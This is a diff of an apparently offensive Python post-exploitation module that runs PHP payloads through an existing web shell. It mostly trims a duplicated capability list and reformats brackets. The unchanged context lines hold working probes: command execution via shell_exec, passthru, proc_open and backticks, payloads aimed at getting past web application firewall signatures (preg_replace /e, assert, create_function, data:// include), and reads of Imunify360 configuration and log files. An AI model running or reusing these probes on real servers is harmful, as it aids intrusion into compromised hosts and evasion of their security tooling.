@@ -48,24 +48,7 @@ class Module(Post, PhpPostHelper):
          'endpoint_pattern_any': [],
          'param_any': [],
          'api_surface_ready': False},
-        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 's7comm', 'from_detail': ''},
-                                   {'capability': 'ot_assets', 'from_detail': ''},
-                                   {'capability': 'ot_assets', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''}],
+        'chain':         {'produces_capabilities': [],
          'consumes_capabilities': ['shell'],
          'option_bindings': {},
          'suggested_followups': []},
@@ -86,8 +69,7 @@ class Module(Post, PhpPostHelper):
             ("exec_shell_exec", "echo function_exists('shell_exec') ? shell_exec('id') : 'NO';", r"uid="),
             ("exec_passthru", "if(function_exists('passthru')){ob_start();passthru('id');echo ob_get_clean();}else echo 'NO';", r"uid="),
             ("exec_proc_open", "if(function_exists('proc_open')){$p=proc_open('id',array(1=>array('pipe','w')),$pipes);echo stream_get_contents($pipes[1]);proc_close($p);}else echo 'NO';", r"uid="),
-            ("exec_backtick", "echo `id`;", r"uid="),
-        ]
+            ("exec_backtick", "echo `id`;", r"uid=")]
 
     def _waf_probes(self) -> list:
         b64_id = "aWQ="  # id
@@ -101,16 +83,14 @@ class Module(Post, PhpPostHelper):
             ("sig_preg_replace_e", "@preg_replace('/.*/e','id', 'x');", r"uid=|NO"),
             ("sig_assert", "@assert('system(\"id\")');", r"uid=|NO"),
             ("sig_create_function", "if(function_exists('create_function')){ $fn=create_function('','return system(\"id\");'); $fn(); } else echo 'NO';", r"uid=|NO"),
-            ("sig_include_data", "include 'data://text/plain,<?php echo system(\"id\"); ?>';", r"uid=|NO"),
-        ]
+            ("sig_include_data", "include 'data://text/plain,<?php echo system(\"id\"); ?>';", r"uid=|NO")]
 
     def _imunify_probes(self) -> list:
         paths = [
             "/etc/imunify360/imunify360.conf",
             "/etc/imunify360/agent.json",
             "/etc/imunify360/whitelist.conf",
-            "/var/log/imunify360/agent.log",
-        ]
+            "/var/log/imunify360/agent.log"]
         probes = []
         for idx, path in enumerate(paths):
             esc = self.escape_php(path)
